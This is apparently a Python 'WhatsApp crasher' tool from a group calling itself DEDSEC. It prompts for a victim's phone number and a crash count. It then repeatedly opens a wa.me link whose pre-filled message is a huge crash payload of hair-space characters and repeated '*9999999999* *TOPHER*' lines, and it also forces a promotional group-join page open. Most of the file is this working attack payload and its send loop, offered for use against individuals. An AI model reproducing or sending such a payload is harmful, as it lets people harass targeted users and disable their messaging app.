# Copyright (c) 2024 Dedsec (2806)

# La permission est par la présente accordée, gratuitement, à toute personne
# obtenant une copie de ce logiciel et des fichiers de documentation associés (le « Logiciel »),
# de traiter le Logiciel sans restriction, y compris, sans limitation, les droits
# d'utiliser, de copier, de modifier, de fusionner, de publier, de distribuer,
# de sous-licencier et/ou de vendre des copies du Logiciel, et de permettre aux personnes
# à qui le Logiciel est fourni de le faire, sous réserve des conditions suivantes :
#
# La mention de droit d'auteur ci-dessus et cette permission devront être incluses dans
# toutes les copies ou parties substantielles du Logiciel.
#
# LE LOGICIEL EST FOURNI « EN L'ÉTAT », SANS GARANTIE D'AUCUNE SORTE, EXPLICITE OU
# IMPLICITE, Y COMPRIS MAIS SANS S'Y LIMITER AUX GARANTIES DE QUALITÉ MARCHANDE,
# D'ADÉQUATION À UN USAGE PARTICULIER ET DE NON-CONTREFAÇON. EN AUCUN CAS, LES AUTEURS
# OU LES DÉTENTEURS DU DROIT D'AUTEUR NE POURRONT ÊTRE TENUS RESPONSABLES DE TOUTE
# RÉCLAMATION, DOMMAGE OU AUTRE RESPONSABILITÉ, QUE CE SOIT DANS UNE ACTION CONTRACTUELLE,
# DÉLICTUELLE OU AUTRE, DÉCOULANT DE, HORS OU EN RELATION AVEC LE LOGICIEL OU L'UTILISATION
# OU AUTREMENT EN LIEN AVEC LE LOGICIEL.
###################################
#  X Top_her (2806)            #
# Projet : DS_CRASHER             #
# Type    : Whatsapp - Crasher    #
###################################
import os
import colorama
import time
import sys
from colorama import  Fore,Style
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
C = Fore.CYAN
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
try:
	import colorama
except ModuleNotFoundError:
	print("Requests is not Installed")
	os.system("pip install colorama")

logo = f"""
{C}                                                                                                      
   ____  ____         ____ ____      _    ____  _   _ _____ ____  
|  _ \/ ___|       / ___|  _ \    / \  / ___|| | | | ____|  _ \ 
| | | \___ \ _____| |   | |_) |  / _ \ \___ \| |_| |  _| | |_) |
| |_| |___) |_____| |___|  _ <  / ___ \ ___) |  _  | |___|  _ < 
|____/|____/       \____|_| \_\/_/   \_\____/|_| |_|_____|_| \_\
                                                   
{W}
TOP_HER(2806)													  
"""
os.system('clear')

def main():
	os.system('clear')
	print(logo)
	print()
	cncode=int(input(f'{G}[{Y}+{G}]{M}Indicatif téléphonique de la victime"+" eg.509 {C}=> '))
	print()
	num=input(f"{G}[{Y}+{G}]{M} Entrer le numéro de la victime\n\n{C}=> {cncode}  ")
	print()
	crash=int(input(f'{G}[{Y}+{G}]{M} Entrer le nombre de crash{W}(Max 15 per 30min) \n\n{C}=> '))
	combnum = f"+{cncode}{num}"
	print()
	Finalcall=input(f'{G}[?]{W} Do You Want To Change NO.{W}{combnum} {R}(Y/N)\n\n{C}=> ')
	if Finalcall == 'Y'  or Finalcall == 'y':
		main()
	elif Finalcall == 'N' or Finalcall == 'n':
		os.system('clear')
		print(f"{G}[{Y}+{G}]{M}Crashing Whatsapp on No. : +{cncode}{num} ...")
		time.sleep(5)
		link = (f"""xdg-open https://wa.me/{combnum}/?text=TOPHER%20%F0%9F%92%A3%20TeaM%20DEDSEC%F0%9F%92%A3%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40mr__2806%F0%9F%A4%A3%0A%F0%9F%94%A5WA_CRASHER%201%20WA_CRASH%20%F0%9F%98%88%0A*NULL%0A*9999999999*%20*X*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*TOPHER%20CRATER%20MR%20PH4N70M%20X%C2%B2*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%0A*9999999999*%20*TOPHER*%20*9999999999*%0A%0A*8888888888*%20*TOPHER*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2KILLER-TOPHER%F0%9F%92%A3%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*%20*8888888888*%0A*9999999999*%20*TOPHER*%20*9999999999*%0A*8888888888*%20*TOPHER*
""")
	for i in range (crash):
		print()
		print(f"{Y}[✓] Sending Now\n")
		print(f"{G}[{Y}+{G}]{M}délai de 40 secondes...")
		link1 = os.system(link)
		time.sleep(40)
		if link1 == 0:
			print(f"{G} Successful")
			pass
		else:
			print(f"{R}[×] Failed  ")
		time.sleep(0.2)
	return main()

def MSG():
	print(Y)
	YTC = input("Join Us(DEDSEC) ? (Y/N): ")
	if YTC == 'Y' or YTC == 'y':
		print(G)
		print("Merci d'avoir rejoindre (DEDSEC)...\n")
		time.sleep(4)
		print("Initializing tool...")
		time.sleep(4)		
		print(W + "\n\n")
		main()
	elif YTC == 'N' or YTC == 'n':
		print("")
		os.system("xdg-open https://hackerTOPHER.blogspot.com/p/join-whatsapp-group.html")
		time.sleep(8)
		os.system("xdg-open https://hackerTOPHER.blogspot.com/p/join-whatsapp-group.html")
		time.sleep(3)
		print(W + "\n\n")
		main()

MSG()
